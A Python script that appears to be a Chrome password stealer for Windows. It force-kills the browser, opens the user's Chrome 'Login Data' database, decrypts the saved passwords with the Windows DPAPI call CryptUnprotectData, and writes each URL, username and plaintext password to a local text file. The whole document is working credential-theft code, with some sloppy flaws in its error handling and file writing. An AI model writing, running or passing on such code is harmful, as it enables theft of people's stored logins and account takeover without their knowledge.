import os
import sqlite3
import win32crypt
import sys
from win32com.client import Dispatch # chrome version

def get_version_via_com(filename):
    parser = Dispatch("Scripting.FileSystemObject")
    try:
        version = parser.GetFileVersion(filename)
    except Exception:
        return None
    return version
if __name__ == "__main__":
    paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
             r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
    version = list(filter(None, [get_version_via_com(p) for p in paths]))[0]
    if version > "79":
        print("[!] Chrome Version:", version,"shouldn't work, but we'll try.")
        pass
        #print("[-] Chrome Version:", version, "- not supported.")
        #sys.exit()
    else:
        print("[+] Chrome Version:",version, "- supported.")

def go_bye_bye_chrome():
    try:
        print("[+] Chrome go bye bye")
        da_browser = 'chrome.exe'
        os.system('taskkill /f /im ' + da_browser)
        print('[-] Chrome went bye bye')
    except Exception as e:
        print('[-] Chrome went bye bye' % (e))
        pass

def get_chrome_init():
    print("[+] omg it's working")
    try:
        path = sys.argv[1]
    except IndexError:
        for w in os.walk(os.getenv('USERPROFILE')):
            if 'Chrome' in w[1]:
                path = str(w[0]) + r'\Chrome\User Data\Default\Login Data'

    # Connect to the Database
    try:
        print('[+] Opening ' + path)
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
    except Exception as e:
        print('[-] %s' % (e))
        sys.exit(1)

    # Get the results
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except Exception as e:
        print('[-] %s' % (e))
        sys.exit(1)

    data = cursor.fetchall()

    if len(data) > 0:
        for result in data:
            # Decrypt the Password
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode('utf-8')
            except Exception as e:
                print('[-] %s' % (e))
                pass
            if password:
                string = ''
                string += "[+] INFORMATION [+]\nURL: %s\nEmail: %s\nPassword: %s "%(result[0], result[1], password)
                with open('da_passwords.txt', 'w') as f:
                    f.write(string)
                    print("(success message) passwords written. :)")
    else:
        print('[-] No results returned from query')
        sys.exit(0)
go_bye_bye_chrome()
get_chrome_init()   
